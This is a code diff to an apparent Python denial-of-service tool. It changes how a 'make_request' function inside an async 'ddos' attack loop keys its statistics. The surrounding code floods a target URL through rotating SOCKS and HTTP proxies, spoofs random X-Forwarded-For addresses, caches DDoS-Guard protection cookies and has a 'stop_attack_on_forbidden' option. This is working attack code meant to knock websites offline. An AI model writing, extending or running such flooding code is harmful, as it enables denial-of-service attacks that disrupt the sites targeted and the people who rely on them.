@@ -34,11 +34,11 @@ URL_STATUS_STATS = defaultdict(lambda: defaultdict(int))
 DDOS_GUARD_COOKIE_CACHE = TTLCache(maxsize=100, ttl=timedelta(hours=1), timer=datetime.now) # 3h is min __ddg5 lifetime, __ddg2 lives 1 year
 UA_FALLBACK = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36"
 
-async def make_request(url: str, proxy: Proxy, timeout: int, headers: Dict[str, str], ignore_response: bool,
+async def make_request(url: str, target_url: str, proxy: Proxy, timeout: int, headers: Dict[str, str], ignore_response: bool,
                        stop_attack_on_forbidden: bool):
     timeout = aiohttp.ClientTimeout(total=timeout)
     logging.debug('Url: %s Proxy: %s header: %s', url, proxy, headers)
-    base_url = url.split('?', 1)[0]
+    base_url = target_url.split('?', 1)[0]
     try:
         request_kwargs = {}
         if proxy and proxy.protocol in ('socks4', 'socks5'):
@@ -133,8 +133,8 @@ async def ddos(
         step += 1
         proxy = get_proxy(proxy_iterator)
         headers = make_headers(user_agent, random_xff_ip, custom_headers, target_headers, ua)
-        await make_request(prepare_url(target_url, with_random_get_param), proxy, timeout, headers, ignore_response,
-                           stop_attack_on_forbidden)
+        await make_request(prepare_url(target_url, with_random_get_param), target_url, proxy,
+                           timeout, headers, ignore_response, stop_attack_on_forbidden)
         log_stats()
 
 
